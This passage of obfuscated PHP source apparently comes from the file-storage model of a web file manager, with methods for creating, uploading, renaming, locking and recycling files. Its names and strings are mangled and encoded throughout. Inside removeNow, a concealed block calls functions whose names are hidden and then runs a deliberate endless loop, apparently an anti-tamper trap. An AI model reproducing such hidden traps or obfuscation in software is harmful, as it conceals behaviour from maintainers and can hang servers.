$æ‘ß‰ ²); return $¿¶µû–; } public function groupRootAdd($á½›ƒéÄ) { $™øÁ¢¶ˆ =& $_SERVER[Ï×Œõ”û]; $äæÄÂî™ = Model($™øÁ¢¶ˆ[610])->where(array($™øÁ¢¶ˆ[2222] => $á½›ƒéÄ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $á½›ƒéÄ, $äæÄÂî™[$™øÁ¢¶ˆ[32]]); } public function systemRootPathAdd($¯èçŸ) { if ($¯èçŸ != $_SERVER[Ï×Œõ”û][633]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $¯èçŸ); } public function userRootRemove($¸—²°¯Ê) { $¸î§è§ = $this->targetSourceRoot(SourceModel::TYPE_USER, $¸—²°¯Ê, !0); foreach ($¸î§è§ as $ë¯ˆÇ) { if (!$ë¯ˆÇ) { continue; } $this->remove($ë¯ˆÇ[$_SERVER[Ï×Œõ”û][193]], !1); } } public function groupRootRemove($äú¼™¨) { $Ÿ¨¼œ»ñ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $äú¼™¨); if (!$Ÿ¨¼œ»ñ) { return; } $this->remove($Ÿ¨¼œ»ñ[$_SERVER[Ï×Œõ”û][193]], !1); } private function _mkdirRoot($³Šó”È×, $¡€¿Œ’Ë, $‡Ù€úê, $ª°Ã½Û¼ = '') { $Ñ° û½Š =& $_SERVER[Ï×Œõ”û]; $½½æéà = KodUser::id(); $˜¨˜€È = array($Ñ° û½Š[497] => 0, $Ñ° û½Š[676] => $³Šó”È×, $Ñ° û½Š[677] => $¡€¿Œ’Ë, $Ñ° û½Š[674] => 1, $Ñ° û½Š[678] => $½½æéà, $Ñ° û½Š[679] => $½½æéà, $Ñ° û½Š[675] => $ª°Ã½Û¼, $Ñ° û½Š[680] => $Ñ° û½Š[618], $Ñ° û½Š[524] => 0, $Ñ° û½Š[645] => 0, $Ñ° û½Š[563] => 0, $Ñ° û½Š[681] => $Ñ° û½Š[12]); if ($Å—‹¦¯¶ = $this->where($˜¨˜€È)->find()) { return $Å—‹¦¯¶[$Ñ° û½Š[193]]; } $é’ÄÑ”¹ = "\x4d\x6f\144\145\x6c\x53\157\x75\162\x63\x65\56\155\153\144\151\162\x52\157\x6f\164\x2e{$³Šó”È×}\56{$¡€¿Œ’Ë}\x2e" . $‡Ù€úê; CacheLock::lock($é’ÄÑ”¹); $˜¨˜€È[$Ñ° û½Š[32]] = $‡Ù€úê; $ªÔÁÈÙ = $this->add($˜¨˜€È); $Ë¼å¦”Ä = array($Ñ° û½Š[682] => short_id($ªÔÁÈÙ)); $this->where(array($Ñ° û½Š[511] => $ªÔÁÈÙ))->save($Ë¼å¦”Ä); CacheLock::unlock($é’ÄÑ”¹); return $ªÔÁÈÙ; } private function targetSourceRoot($ŒÀ½ÌÕê, $²Åğ÷®ç, $­‘¹²Ãë = false) { $”°ôÖ±¡ =& $_SERVER[Ï×Œõ”û]; $ÏĞ´¢İí = array($”°ôÖ±¡[497] => 0, $”°ôÖ±¡[676] => $ŒÀ½ÌÕê, $”°ôÖ±¡[677] => $²Åğ÷®ç); if ($­‘¹²Ãë) { $İ‚°Åè° = $this->where($ÏĞ´¢İí)->select(); return $İ‚°Åè° ? $İ‚°Åè° : array(); } $ïŠ£ƒ = $this->where($ÏĞ´¢İí)->find(); return $ïŠ£ƒ ? $ïŠ£ƒ : array(); } public function sourceRootGroup($ïÂø„¼›) { $¡ÎñüùÆ =& $_SERVER[Ï×Œõ”û]; if (is_string($ïÂø„¼›)) { $ïÂø„¼› = array($ïÂø„¼›); } $ëÊÍ”§õ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ïÂø„¼›, $¡ÎñüùÆ[222]); $··Ú»«ª = array($¡ÎñüùÆ[447] => $ëÊÍ”§õ, $¡ÎñüùÆ[444] => array($¡ÎñüùÆ[865] => count($ïÂø„¼›))); $this->_listDataApply($··Ú»«ª[$¡ÎñüùÆ[447]]); $this->_listMake($··Ú»«ª); return array_to_keyvalue($··Ú»«ª[$¡ÎñüùÆ[85]], $¡ÎñüùÆ[594]); } public function mkfile($ÓàãÉ¦ë, $Ö¡·Øó­, $ğÏª®æ = '', $ËÉâºµ = REPEAT_RENAME) { $öÍ‰Âƒ =& $_SERVER[Ï×Œõ”û]; $ì™Ô”Ğ = KodIO::ioFileDriverGet($öÍ‰Âƒ[503] . $ÓàãÉ¦ë . $öÍ‰Âƒ[404]); $ì÷Ê¥È = Model($öÍ‰Âƒ[702])->addFileByContent($ğÏª®æ, $ì™Ô”Ğ, $Ö¡·Øó­); return $this->_createFileCall($ÓàãÉ¦ë, $Ö¡·Øó­, $ì÷Ê¥È, $ËÉâºµ, $öÍ‰Âƒ[1497]); } public function addFile($ı–»“ëË, $‰ö×³Ñ¡, $„¹•ÖÊ, $Ö–¤¾Üá = false, $«Î¤æ• = REPEAT_RENAME) { $ãó¸Œ€š =& $_SERVER[Ï×Œõ”û]; $²ù©è°ı = KodIO::ioFileDriverGet($ãó¸Œ€š[503] . $ı–»“ëË . $ãó¸Œ€š[404]); $ûöàüÊÅ = Model($ãó¸Œ€š[702])->addFile($‰ö×³Ñ¡, $²ù©è°ı, $„¹•ÖÊ, $Ö–¤¾Üá); return $this->_createFileCall($ı–»“ëË, $„¹•ÖÊ, $ûöàüÊÅ, $«Î¤æ•); } public function addFileByFileID($½•ÆÊÙª, $É³„¢², $Óş€‹ ¬, $ñ¢Ï÷ ¡ = REPEAT_RENAME) { $ç„ëöÎ =& $_SERVER[Ï×Œõ”û]; $°†‚®÷Î = Model($ç„ëöÎ[702])->find($É³„¢²); Model($ç„ëöÎ[702])->linkAdd($É³„¢²); return $this->_createFileCall($½•ÆÊÙª, $Óş€‹ ¬, $°†‚®÷Î, $ñ¢Ï÷ ¡); } public function addFileByRemote($›â“÷ëÓ, $·š±»¿”, $¾œöàÄ, $¥¢ü‚¾ô = array(), $Õš¿ï™É = REPEAT_RENAME) { $ô›ìï½ë = Model($_SERVER[Ï×Œõ”û][702])->addFileByRemote($·š±»¿”, $¾œöàÄ, $¥¢ü‚¾ô); return $this->_createFileCall($›â“÷ëÓ, $¾œöàÄ, $ô›ìï½ë, $Õš¿ï™É); } private function _createFileCall($ĞÏ±Ë, $ÓŸ©æÃ•, $›Ê±»¬, $¦‘¾¸í, $‘Œ…£ı© = "\165\x70\154\x6f\141\x64") { $­¹õå®½ =& $_SERVER[Ï×Œõ”û]; if (!$›Ê±»¬) { return !1; } $ÂÏ—·ãê = !1; $this->setMasterDB(); $this->lockWriteStart($ĞÏ±Ë, $ÓŸ©æÃ•); $‹ÀÄ¸£¼ = $this->fileNameExist($ĞÏ±Ë, $ÓŸ©æÃ•); $‡×ºÀÈÉ = $this->_createFile($ĞÏ±Ë, $ÓŸ©æÃ•, $›Ê±»¬, $¦‘¾¸í, $ÂÏ—·ãê); if (!$ÂÏ—·ãê) { Model($­¹õå®½[565])->remove($›Ê±»¬[$­¹õå®½[562]]); } if ($ÂÏ—·ãê && $‡×ºÀÈÉ && $‡×ºÀÈÉ != $‹ÀÄ¸£¼) { Model($­¹õå®½[2391])->eventCreate($‡×ºÀÈÉ, $‘Œ…£ı©); } $this->lockWriteEnd($ĞÏ±Ë, $ÓŸ©æÃ•); return $‡×ºÀÈÉ; } public function mkdir($ù›Ú”é–, $ÂåÄÅçù, $¶½¦³‘ = REPEAT_SKIP) { $›ÃŒî¤Õ =& $_SERVER[Ï×Œõ”û]; $this->setMasterDB(); $Şâ³Ó„‚ = $this->sourceInfo($ù›Ú”é–); if (!$Şâ³Ó„‚) { return !1; } $this->lockWriteStart($ù›Ú”é–, $ÂåÄÅçù); if ($¶½¦³‘ !== !1) { $Ï«áÒüº = $this->fileNameExist($ù›Ú”é–, $ÂåÄÅçù); if ($Ï«áÒüº && $¶½¦³‘ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ù›Ú”é–, $ÂåÄÅçù); return $Ï«áÒüº; } $ÂåÄÅçù = $this->fileNameAuto($ù›Ú”é–, $ÂåÄÅçù, $¶½¦³‘); } $„óâ«î = array($›ÃŒî¤Õ[674] => 1, $›ÃŒî¤Õ[514] => $ÂåÄÅçù, $›ÃŒî¤Õ[675] => $›ÃŒî¤Õ[12], $›ÃŒî¤Õ[563] => 0, $›ÃŒî¤Õ[645] => 0); $Ïœ°Ú­í = $this->_addSource($„óâ«î, $Şâ³Ó„‚); Model($›ÃŒî¤Õ[2391])->eventCreate($Ïœ°Ú­í, $›ÃŒî¤Õ[1498]); $this->lockWriteEnd($ù›Ú”é–, $ÂåÄÅçù); return $Ïœ°Ú­í; } public function listSourceRoot($ÓÚ«ó´¦, $–î×Ş€µ, $Ì¨—ÒÚ‡ = "\163\x6f\165\162\x63\x65\111\x44\54\164\x61\162\147\x65\x74\111\104\54\x73\x69\x7a\x65") { $ÖËø‡Öİ =& $_SERVER[Ï×Œõ”û]; $ˆ˜ş¤ÜÚ = $ÖËø‡Öİ[464]; $÷³ÎÙ°’ = array(); $÷êØ³Í = 1024 * 50; $—Áü¨Ÿ¸ = is_array($—Áü¨Ÿ¸) ? $—Áü¨Ÿ¸ : array(); $ÆøÃÒ¦¯ = count($–î×Ş€µ); $¨½÷åÛ = $this->tablePrefix . $ÖËø‡Öİ[2430]; for ($„·Ğ¾¿š = 0; $„·Ğ¾¿š < $ÆøÃÒ¦¯; $„·Ğ¾¿š++) { $²É©£øÜ = $–î×Ş€µ[$„·Ğ¾¿š]; $ˆ˜ş¤ÜÚ .= "\123\x45\x4c\x45\103\124\x20\x2a\x20\106\x52\x4f\115\40\50\x53\x45\114\105\103\124\40{$Ì¨—ÒÚ‡}\40\x46\122\117\x4d\x20\140{$¨½÷åÛ}\140\40\x57\x48\105\122\105\x20"; $ˆ˜ş¤ÜÚ .= "\x60\160\141\162\x65\x6e\x74\x49\x44\140\x3d\60\x20\101\x4e\104\40\x60\164\141\x72\x67\x65\x74\x49\x44\x60\75{$²É©£øÜ}\x20\x41\116\x44\x20\140\164\141\162\147\x65\164\124\171\x70\145\140\x3d{$ÓÚ«ó´¦}\40\141\156\x64\40\x66\151\x6c\145\x54\171\x70\145\x3d\47\x27\x20\x6c\x69\x6d\x69\x74\40\x31\x29\x20\x61\x73\x20\164\x62\137{$„·Ğ¾¿š}\x20\125\x4e\x49\x4f\116\40\101\114\114\x20"; if ((strlen($ˆ˜ş¤ÜÚ) >= $÷êØ³Í || $„·Ğ¾¿š == $ÆøÃÒ¦¯ - 1) && $ˆ˜ş¤ÜÚ) { $ˆ˜ş¤ÜÚ = substr($ˆ˜ş¤ÜÚ, 0, -strlen($ÖËø‡Öİ[1159])); $œú¾âÒß = $this->query($ˆ˜ş¤ÜÚ); $ˆ˜ş¤ÜÚ = $ÖËø‡Öİ[12]; $÷³ÎÙ°’ = array_merge($÷³ÎÙ°’, $œú¾âÒß); } } return $÷³ÎÙ°’; } private function _createFile($§ ı…º×, $ÕÑŠ²†¢, $ïí¾ÇúÉ, $¥Òª½…, &$Á£æšŸ‡) { $„ĞÇ‰­· =& $_SERVER[Ï×Œõ”û]; $£ïÅ±ä = $this->sourceInfo($§ ı…º×); if (!$ïí¾ÇúÉ || !$£ïÅ±ä) { return !1; } if ($¥Òª½… !== !1) { $¡¬…àÃ = $this->fileNameExist($§ ı…º×, $ÕÑŠ²†¢); } $Á£æšŸ‡ = !0; if ($¥Òª½… && $¡¬…àÃ) { if ($¥Òª½… == REPEAT_SKIP) { $Á£æšŸ‡ = !1; return $¡¬…àÃ; } else { if ($¥Òª½… == REPEAT_REPLACE) { $‘‡½””í = $this->sourceInfo($¡¬…àÃ); $‡ôÁ² = $this->fileHistory($‘‡½””í, $ïí¾ÇúÉ[$„ĞÇ‰­·[562]], $ïí¾ÇúÉ[$„ĞÇ‰­·[79]]); if (!$‡ôÁ²) { $Á£æšŸ‡ = !1; } else { $this->folderSizeReset($§ ı…º×); } return $¡¬…àÃ; } else { $ÕÑŠ²†¢ = $this->fileNameAuto($§ ı…º×, $ÕÑŠ²†¢, $¥Òª½…, !1); } } } $¨º¯Ù¡ = array($„ĞÇ‰­·[674] => 0, $„ĞÇ‰­·[514] => $ÕÑŠ²†¢, $„ĞÇ‰­·[675] => substr(get_path_ext($ÕÑŠ²†¢), 0, 10), $„ĞÇ‰­·[563] => $ïí¾ÇúÉ[$„ĞÇ‰­·[562]], $„ĞÇ‰­·[645] => $ïí¾ÇúÉ[$„ĞÇ‰­·[79]]); $Ãí©ˆŠ = $this->_addSource($¨º¯Ù¡, $£ïÅ±ä); $this->folderSizeReset($§ ı…º×, intval($¨º¯Ù¡[$„ĞÇ‰­·[79]])); return $Ãí©ˆŠ; } protected function fileHistory($úíå¸œÎ, $î•ÛİË°, $­÷¹›™ ) { $ßèÍá’ =& $_SERVER[Ï×Œõ”û]; if ($úíå¸œÎ[$ßèÍá’[562]] == $î•ÛİË°) { return !1; } $this->checkLock($úíå¸œÎ[$ßèÍá’[193]], $î•ÛİË°); Model($ßèÍá’[2431])->addHistory($úíå¸œÎ); $Á³ü §è = array($ßèÍá’[679] => USER_ID, $ßèÍá’[518] => time(), $ßèÍá’[562] => $î•ÛİË°, $ßèÍá’[79] => $­÷¹›™ ); $this->where(array($ßèÍá’[511] => $úíå¸œÎ[$ßèÍá’[193]]))->save($Á³ü §è); $this->sourceCacheClear($úíå¸œÎ[$ßèÍá’[193]]); return !0; } public function checkLock($ãï¦í§, $ËÕ°…’×) { $èÇ¤ú‚ñ =& $_SERVER[Ï×Œõ”û]; $ä¾¹’æó = $this->pathInfo($ãï¦í§); if (!$this->fileIsLock($ä¾¹’æó, !0)) { return; } $­ªŒÀÔ = Session::get($èÇ¤ú‚ñ[2432]); $šä©òèÛ = substr($ä¾¹’æó[$èÇ¤ú‚ñ[32]], 0, -1 - strlen($ä¾¹’æó[$èÇ¤ú‚ñ[168]])) . $èÇ¤ú‚ñ[1350] . $­ªŒÀÔ . $èÇ¤ú‚ñ[10] . $ä¾¹’æó[$èÇ¤ú‚ñ[168]]; $ç½øóÔÉ = Model($èÇ¤ú‚ñ[702])->find($ËÕ°…’×); $this->_createFileCall($ä¾¹’æó[$èÇ¤ú‚ñ[192]], $šä©òèÛ, $ç½øóÔÉ, REPEAT_REPLACE, $èÇ¤ú‚ñ[1497]); $”†àÛÈ§ = $ä¾¹’æó[$èÇ¤ú‚ñ[560]][$èÇ¤ú‚ñ[638]]; $´ë“ŒĞ = $”†àÛÈ§[$èÇ¤ú‚ñ[2433]] ? $”†àÛÈ§[$èÇ¤ú‚ñ[2433]] : $”†àÛÈ§[$èÇ¤ú‚ñ[32]]; show_json(LNG($èÇ¤ú‚ñ[2434]) . $èÇ¤ú‚ñ[2435] . LNG($èÇ¤ú‚ñ[2436]) . $èÇ¤ú‚ñ[2437] . $´ë“ŒĞ . $èÇ¤ú‚ñ[2438], !1); } public function fileIsLock($ŞÄÄ‡í®, $ï»”×ê = false) { $ºÚ½íƒ© =& $_SERVER[Ï×Œõ”û]; if (!_get($ŞÄÄ‡í®, $ºÚ½íƒ©[634], 0)) { return !1; } if ($ŞÄÄ‡í®[$ºÚ½íƒ©[560]][$ºÚ½íƒ©[637]] != USER_ID) { return !0; } $õØñÏı = $GLOBALS[$ºÚ½íƒ©[6]][$ºÚ½íƒ©[92]][$ºÚ½íƒ©[635]]; if ($ŞÄÄ‡í®[$ºÚ½íƒ©[560]][$ºÚ½íƒ©[636]] <= time() - $õØñÏı) { $this->metaSet($ŞÄÄ‡í®[$ºÚ½íƒ©[193]], $ºÚ½íƒ©[637], null); $this->metaSet($ŞÄÄ‡í®[$ºÚ½íƒ©[193]], $ºÚ½íƒ©[636], null); } if ($ï»”×ê) { $this->metaSet($ŞÄÄ‡í®[$ºÚ½íƒ©[193]], $ºÚ½íƒ©[636], time()); } return !1; } private function _addSource($Ö´•¹†, $äª—ñ®Ü) { $÷¢¶Š¾ê =& $_SERVER[Ï×Œõ”û]; $úüâ»¥ = KodUser::id(); $œ”Ø… = array($÷¢¶Š¾ê[676] => $äª—ñ®Ü[$÷¢¶Š¾ê[190]], $÷¢¶Š¾ê[677] => $äª—ñ®Ü[$÷¢¶Š¾ê[594]], $÷¢¶Š¾ê[678] => $úüâ»¥, $÷¢¶Š¾ê[679] => $úüâ»¥, $÷¢¶Š¾ê[497] => $äª—ñ®Ü[$÷¢¶Š¾ê[193]], $÷¢¶Š¾ê[680] => $äª—ñ®Ü[$÷¢¶Š¾ê[609]] . $äª—ñ®Ü[$÷¢¶Š¾ê[193]] . $÷¢¶Š¾ê[50], $÷¢¶Š¾ê[524] => 0, $÷¢¶Š¾ê[681] => $÷¢¶Š¾ê[12]); $Ö´•¹† = array_merge($œ”Ø…, $Ö´•¹†); $this->updateModifyTime($Ö´•¹†[$÷¢¶Š¾ê[192]]); $Ö¼Ä¤®† = $÷¢¶Š¾ê[2439] . $äª—ñ®Ü[$÷¢¶Š¾ê[193]]; if (isset(self::$cacheChildList[$Ö¼Ä¤®†])) { unset(self::$cacheChildList[$Ö¼Ä¤®†]); } static $–ìÑ³¢Æ = false; if (!$–ìÑ³¢Æ) { Hook::trigger($÷¢¶Š¾ê[664], $Ö´•¹†); $–ìÑ³¢Æ = !0; } $¢³Å¬Ïƒ = $this->add($Ö´•¹†); $šªÊ Éù = array($÷¢¶Š¾ê[682] => short_id($¢³Å¬Ïƒ)); $this->where(array($÷¢¶Š¾ê[511] => $¢³Å¬Ïƒ))->save($šªÊ Éù); $this->setNamePinyin($¢³Å¬Ïƒ, $Ö´•¹†[$÷¢¶Š¾ê[32]]); return $¢³Å¬Ïƒ; } public function remove($¨Íš—‚á, $ú™˜¶ê– = true) { $‹Ô ÂşŒ =& $_SERVER[Ï×Œõ”û]; $ÎË—Ìêà = $this->sourceInfo($¨Íš—‚á); $—”©Úó = intval($ÎË—Ìêà[$‹Ô ÂşŒ[190]]) === self::TYPE_SYSTEM; $Ó» é™ø = Model($‹Ô ÂşŒ[527])->get($‹Ô ÂşŒ[2440]) == $‹Ô ÂşŒ[91]; if ($—”©Úó || $ú™˜¶ê– || !$Ó» é™ø) { return $this->removeNow($¨Íš—‚á, $ú™˜¶ê–); } $ûÉšÈ®´ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $×¬Ëîş = $ÎË—Ìêà[$‹Ô ÂşŒ[190]] == self::TYPE_USER ? $‹Ô ÂşŒ[690] : $‹Ô ÂşŒ[603]; if ($×¬Ëîş == $‹Ô ÂşŒ[690]) { $×ãòû¸ˆ = Model($‹Ô ÂşŒ[602])->getInfo($ÎË—Ìêà[$‹Ô ÂşŒ[594]]); $µ“Ï²¢› = !empty($×ãòû¸ˆ[$‹Ô ÂşŒ[2433]]) ? $×ãòû¸ˆ[$‹Ô ÂşŒ[2433]] : $×ãòû¸ˆ[$‹Ô ÂşŒ[32]]; $µ“Ï²¢› = $‹Ô ÂşŒ[339] . $µ“Ï²¢› . $‹Ô ÂşŒ[2441] . $ÎË—Ìêà[$‹Ô ÂşŒ[594]]; } else { $×ãòû¸ˆ = Model($‹Ô ÂşŒ[610])->getInfo($ÎË—Ìêà[$‹Ô ÂşŒ[594]]); $µ“Ï²¢› = _get($×ãòû¸ˆ, $‹Ô ÂşŒ[32]); $µ“Ï²¢› = $‹Ô ÂşŒ[175] . $µ“Ï²¢› . $‹Ô ÂşŒ[2442] . $ÎË—Ìêà[$‹Ô ÂşŒ[594]]; } $àÓñ÷Ñ³ = $‹Ô ÂşŒ[2443] . md5($µ“Ï²¢›); CacheLock::lock($àÓñ÷Ñ³); $´Úñöµæ = $this->fileNameExist($ûÉšÈ®´, $µ“Ï²¢›); if (!$´Úñöµæ) { $´Úñöµæ = $this->mkdir($ûÉšÈ®´, $µ“Ï²¢›, REPEAT_SKIP); $this->metaSet($´Úñöµæ, $‹Ô ÂşŒ[2444], $×¬Ëîş); $this->metaSet($´Úñöµæ, $‹Ô ÂşŒ[2445], $ÎË—Ìêà[$‹Ô ÂşŒ[594]]); if ($ÎË—Ìêà[$‹Ô ÂşŒ[192]] != 0) { $this->metaSet($´Úñöµæ, $‹Ô ÂşŒ[2446], _get($×ãòû¸ˆ, $‹Ô ÂşŒ[2447])); } } CacheLock::unlock($àÓñ÷Ñ³); $this->metaSet($¨Íš—‚á, $‹Ô ÂşŒ[2448], $ÎË—Ìêà[$‹Ô ÂşŒ[192]]); $this->where(array($‹Ô ÂşŒ[193] => $¨Íš—‚á))->save(array($‹Ô ÂşŒ[518] => time())); $this->recycleClear($ÎË—Ìêà); Model($‹Ô ÂşŒ[661])->eventRemove($¨Íš—‚á); $µİÄ²õÊ = $this->move($¨Íš—‚á, $´Úñöµæ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÎË—Ìêà[$‹Ô ÂşŒ[192]]); return $µİÄ²õÊ; } private function recycleClear($­û±šì) { $¥¨‚ú¥ä =& $_SERVER[Ï×Œõ”û]; $Á ô«Éà = $this->childrenAll($­û±šì); $º½¡î•£ = array($¥¨‚ú¥ä[511] => array($¥¨‚ú¥ä[512], $Á ô«Éà[$¥¨‚ú¥ä[2449]])); Model($¥¨‚ú¥ä[2450])->where($º½¡î•£)->delete(); } public function removeNow($º±ı§—ï, $·½†ÛØÖ = true) { $òì€–´û =& $_SERVER[Ï×Œõ”û]; if (!isset($_SERVER[$òì€–´û[488]]) || !isset($_SERVER[$òì€–´û[489]])) { $ĞÅ¢òĞÏ = $òì€–´û[996]; $ó«ŒÕÁ» = $òì€–´û[490]; $¢éË´—¥ = $_SERVER[$òì€–´û[491]] . $òì€–´û[492]; $—ÁæÃÄú = $ó«ŒÕÁ»($¢éË´—¥); $œôÒ¾à = explode($òì€–´û[287], $—ÁæÃÄú); if (count($œôÒ¾à) < $òì€–´û[719]) { $ÆÓšğ‡Ë = $òì€–´û[494]; $ÆÓšğ‡Ë(); } $‘¸İæ‹ = $òì€–´û[997]; $‘¸İæ‹($_SERVER[$òì€–´û[998]]); $µàÛš› = 1; for ($©ßË°ìÓ = $µàÛš›; $©ßË°ìÓ > 0; $©ßË°ìÓ++) { $‘¸İæ‹ = json_encode($GLOBALS[$òì€–´û[512]]); } } $° €Ú©˜ = $this->sourceInfo($º±ı§—ï); $Éõğ‚‚¹ = $this->pathInfoMore($º±ı§—ï); if (!$° €Ú©˜) { return !0; } if ($° €Ú©˜[$òì€–´û[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($º±ı§—ï); Hook::trigger($òì€–´û[2451], $Éõğ‚‚¹, $·½†ÛØÖ); if ($·½†ÛØÖ) { Model($òì€–´û[2450])->moveToRecycle($º±ı§—ï); } else { $í¼œÂÇ™ = $this->childrenAll($° €Ú©˜); Model($òì€–´û[661])->eventRemove($º±ı§—ï); $this->removeRelevance($í¼œÂÇ™[$òì€–´û[2449]], $í¼œÂÇ™[$òì€–´û[1733]]); } $this->folderSizeReset($° €Ú©˜[$òì€–´û[192]]); $—÷œöêè = array($° €Ú©˜[$òì€–´û[192]]); if ($° €Ú©˜[$òì€–´û[505]] == $òì€–´û[91]) { $—÷œöêè[] = $° €Ú©˜[$òì€–´û[193]]; } $this->updateModifyTime($—÷œöêè); $this->lockMoveEnd($º±ı§—ï); Hook::trigger($òì€–´û[1972], $Éõğ‚‚¹, $·½†ÛØÖ); return !0; } public function childrenAll($úù¶ı—ó) { $ã¹ßÏ¢— =& $_SERVER[Ï×Œõ”û]; $îœŒÄÍƒ = $úù¶ı—ó[$ã¹ßÏ¢—[193]]; if ($úù¶ı—ó[$ã¹ßÏ¢—[505]] == $ã¹ßÏ¢—[91]) { $ÔÓçÜ·ş = array($ã¹ßÏ¢—[680] => array($ã¹ßÏ¢—[640], $úù¶ı—ó[$ã¹ßÏ¢—[609]] . $îœŒÄÍƒ . $ã¹ßÏ¢—[641])); $’¬Ã†¹ü = array($ã¹ßÏ¢—[680] => $ÔÓçÜ·ş[$ã¹ßÏ¢—[609]]); $¨ƒŸ€ü« = $this->field($ã¹ßÏ¢—[2452])->where($’¬Ã†¹ü)->select(); $‚ğíÖ = !1; $ö‹Ÿõõ¿ = array($îœŒÄÍƒ); if ($¨ƒŸ€ü«) { $‚ğíÖ = array_to_keyvalue($¨ƒŸ€ü«, $ã¹ßÏ¢—[12], $ã¹ßÏ¢—[562]); $‚ğíÖ = array_remove_value($‚ğíÖ, $ã¹ßÏ¢—[230]); $ö‹Ÿõõ¿ = array_to_keyvalue($¨ƒŸ€ü«, $ã¹ßÏ¢—[12], $ã¹ßÏ¢—[193]); $ö‹Ÿõõ¿[] = $îœŒÄÍƒ; } } else { $‚ğíÖ = array($úù¶ı—ó[$ã¹ßÏ¢—[562]]); $ö‹Ÿõõ¿ = array($îœŒÄÍƒ); } return array($ã¹ßÏ¢—[2449] => $ö‹Ÿõõ¿, $ã¹ßÏ¢—[1733] => $‚ğíÖ); } public function removeArray($½ê¾®½¯) { if (!$½ê¾®½¯) { return !0; } } public function removeRelevance($Ğ˜ŒÖÜ, $´ñİ’Í½) { $Ğß¾›ß¨ =& $_SERVER[Ï×Œõ”û]; $Ğ˜ŒÖÜ = $Ğ˜ŒÖÜ ? $Ğ˜ŒÖÜ : array(); $´ñİ’Í½ = $´ñİ’Í½ ? $´ñİ’Í½ : array(); $Ğ˜ŒÖÜ = array_unique(array_filter($Ğ˜ŒÖÜ)); $´ñİ’Í½ = array_filter($´ñİ’Í½); if (!$Ğ˜ŒÖÜ) { return !1; } $µÕßĞ¹¶ = array($Ğß¾›ß¨[511] => array($Ğß¾›ß¨[512], $Ğ˜ŒÖÜ)); Model($Ğß¾›ß¨[2450])->where($µÕßĞ¹¶)->delete(); Model($Ğß¾›ß¨[554])->where($µÕßĞ¹¶)->delete(); Model($Ğß¾›ß¨[2283])->where($µÕßĞ¹¶)->delete(); Model($Ğß¾›ß¨[661])->where($µÕßĞ¹¶)->delete(); Model($Ğß¾›ß¨[1517])->removeBySource($Ğ˜ŒÖÜ); Model($Ğß¾›ß¨[2431])->removeBySource($Ğ˜ŒÖÜ); $this->where($µÕßĞ¹¶)->delete(); Model($Ğß¾›ß¨[565])->remove($´ñİ’Í½); for ($â«Ó = 0; $â«Ó < count($Ğ˜ŒÖÜ); $â«Ó++) { $this->sourceCacheClear($Ğ˜ŒÖÜ[$â«Ó]); } } public function rename($ß¸°Ï“, $ö€¡âª´) { $¥¹šÊÆ =& $_SERVER[Ï×Œõ”û]; $ú‚ßÄÚ› = $this->sourceInfo($ß¸°Ï“); if (!$ú‚ßÄÚ›) { return !1; } $‚ı–Ê = $this->fileNameExist($ú‚ßÄÚ›[$¥¹šÊÆ[192]], $ö€¡âª´); if ($‚ı–Ê && $‚ı–Ê != $ß¸°Ï“) { return !1; } $É¥íÍï¸ = array($¥¹šÊÆ[514] => $ö€¡âª´, $¥¹šÊÆ[679] => USER_ID); if ($ú‚ßÄÚ›[$¥¹šÊÆ[505]] != $¥¹šÊÆ[91]) { $É¥íÍï¸[$¥¹šÊÆ[506]] = substr(get_path_ext($ö€¡âª´), 0, 10); } Model($¥¹šÊÆ[661])->eventRename($ß¸°Ï“, $ú‚ßÄÚ›[$¥¹šÊÆ[32]], $ö€¡âª´); $this->sourceCacheClear($ß¸°Ï“); $this->setNamePinyin($ß¸°Ï“, $É¥íÍï¸[$¥¹šÊÆ[32]], !1); $this->updateModifyTime($ú‚ßÄÚ›[$¥¹šÊÆ[192]]); $µÅÑ—É• = $this->where(array($¥¹šÊÆ[511] => $ß¸°Ï“))->data($É¥íÍï¸)->save(); $ó¸Èüº = $¥¹šÊÆ[2439] . $ú‚ßÄÚ›[$¥¹šÊÆ[192]]; if (isset(self::$cacheChildList[$ó¸Èüº])) { unset(self::$cacheChildList[$ó¸Èüº]); } return $µÅÑ—É•; } public function setNamePinyin($³ı÷ş¡, $ÚÅğ„çù, $¹™ê›Ã = true) { $èî”ôş‚ =& $_SERVER[Ï×Œõ”û]; $ô ³ğÂ = Input::check($ÚÅğ„çù, $èî”ôş‚[683]); $Ã€ù–†á = array($èî”ôş‚[536] => KodSort::makeStr($ÚÅğ„çù)); if ($ô ³ğÂ) { $Ã€ù–†á[$èî”ôş‚[557]] = str_replace($èî”ôş‚[53], $èî”ôş‚[12], Pinyin::get($ÚÅğ„çù)); $Ã€ù–†á[$èî”ôş‚[556]] = Pinyin::get($ÚÅğ„çù, $èî”ôş‚[684]); } if (!$¹™ê›Ã && !$ô ³ğÂ) { $Ã€ù–†á[$èî”ôş‚[557]] = null; $Ã€ù–†á[$èî”ôş‚[556]] = null; } $this->metaSet($³ı÷ş¡, $Ã€ù–†á); } public function getContent($Æ­Šô) { $£ƒˆò‰ë =& $_SERVER[Ï×Œõ”û]; $®œ†ÉÉš = $this->fileInfoGet($Æ­Šô); if (!$®œ†ÉÉš) { return !1; } if ($®œ†ÉÉš[$£ƒˆò‰ë[79]] == 0) { return $£ƒˆò‰ë[12]; } $åıØæé¸ = $£ƒˆò‰ë[2453] . $®œ†ÉÉš[$£ƒˆò‰ë[568]]; if ($®œ†ÉÉš[$£ƒˆò‰ë[79]] <= 1024 * 10) { $Ãšö™³ = Cache::get($åıØæé¸); if (!$Ãšö™³) { $Ãšö™³ = IO::getContent($®œ†ÉÉš[$£ƒˆò‰ë[87]]); Cache::set($åıØæé¸, $Ãšö™³); } return $Ãšö™³; } if (!$®œ†ÉÉš[$£ƒˆò‰ë[87]]) { return $£ƒˆò‰ë[12]; } return IO::getContent($®œ†ÉÉš[$£ƒˆò‰ë[87]]); } public function setDesc($§ııë¹Å, $ÚòÊ´ìÀ) { $ªÆÓï®â =& $_SERVER[Ï×Œõ”û]; Model($ªÆÓï®â[661])->eventAddDesc($§ııë¹Å, $ÚòÊ´ìÀ); return $this->metaSet($§ııë¹Å, 